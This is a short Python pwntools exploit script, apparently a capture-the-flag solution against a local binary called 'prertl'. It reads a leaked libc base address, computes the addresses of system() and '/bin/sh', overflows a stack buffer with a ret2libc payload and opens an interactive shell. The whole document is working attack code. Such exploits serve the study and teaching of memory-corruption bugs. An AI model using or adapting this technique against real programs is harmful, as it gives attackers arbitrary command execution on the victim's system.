from pwn import *
p = process(["./prertl"])
p.recvuntil("Library base address ( libc_base ) : ")
libc_base = int(p.recvuntil("\n")[:-1], 0)
system = libc_base + 0x3ada0
binsh = libc_base + 0x15b9ab
p.sendline("A" * 0x6c + "B" * 4 + p32(system) + p32(0xdeadbeef) + p32(binsh))
p.interactive()
